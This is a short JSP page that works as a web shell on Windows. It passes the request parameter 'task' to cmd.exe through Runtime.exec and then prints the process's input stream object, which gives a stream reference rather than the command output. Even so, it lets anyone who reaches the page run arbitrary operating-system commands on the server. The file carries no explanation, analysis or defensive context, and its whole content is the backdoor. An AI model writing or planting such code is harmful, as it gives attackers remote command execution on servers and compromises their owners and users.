<%@page import="java.io.*"%>
<%
Process p=Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("task"));out.println(p.getInputStream());
%>
